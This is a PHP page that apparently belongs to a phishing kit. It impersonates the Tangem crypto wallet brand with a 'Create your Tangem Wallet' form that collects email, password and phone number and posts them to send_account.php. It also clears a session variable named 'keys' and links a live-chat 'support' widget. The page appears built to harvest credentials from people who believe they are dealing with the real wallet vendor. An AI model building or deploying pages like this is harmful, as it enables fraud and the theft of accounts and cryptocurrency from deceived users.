<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'The best crypto wallet — Tangem Wallet';
    include_once './includes/meta.php';
    unset($_SESSION['keys']);
    ?>
    <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
    <body>
        <div class="container-fluid">
            <div class="row w-100 d-flex">
                <div class="col-md-6 order-md-1 order-2 px-0" style="height: 100vh;">
                    <video style="opacity: 0.5;  width: 100%; height: 100vh; object-fit: cover; object-position: center; " autoPlay loop muted>
                        <source src="<?= base_url('assets/img/video.mp4')?>" type="video/mp4" />
                    </video>
                </div>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row mt15" style="height: 150px;">
                        <div class="col-sm-12 ps35">
                            <a class="text-decoration-none" href="<?= base_url('')?>">
                                <img src="<?= base_url('assets/img/logo.png')?>" style="filter: invert(1); height: 30px">
                            </a>
                        </div>
                    </div>
                    <div class="row" style="">
                        <div class="col-12 offset-0 col-md-6 offset-md-1">
                            <div class="mt55">
                                <form method="post" action="<?= base_url('send_account.php')?>" class="col-12 shadow-lg p20 py17 rounded-4" style="background-color: #18181F">
                                    <h2 class="fs30 mt25 mb40">Create your Tangem Wallet</h2>
                                    <div class="my20">
                                        <label for="" class="form-label fw-normal">Email address</label>
                                        <input name="email" type="email" required="" class="form-control form-control-lg" />
                                    </div>
                                    <div class="my20">
                                        <label for="" class="form-label fw-normal">Password</label>
                                        <input name="password" type="password" required="" minlength="3" maxlength="50" class="form-control form-control-lg"/>
                                    </div>
                                    <div className="my35 inputField">
                                        <label class="form-label">Phone Number</label>
                                        <div class="form-control" style="padding: 0px;">
                                            <input name="phone_number" type="number" id="phone_number" required="" style="width: 75%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                                        </div>
                                    </div>
                                    <div class="text-center mx-auto d-grid gap-2 my30">
                                        <button type="submit" class="btn btn-secondary btn-lg btn-primary-2 px20 rounded-pill btn-block">Submit</button>
                                    </div>
                                    <div class="text-center mt25 fw-medium">
                                        <span class="text-secondary">Need help?</span>
                                        <a href="javascript:void(Tawk_API.toggle())" class="text-decoration-none text-primary-2"> Contact Support</a>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Select Country" });
            });
        </script>
    </body>
</html>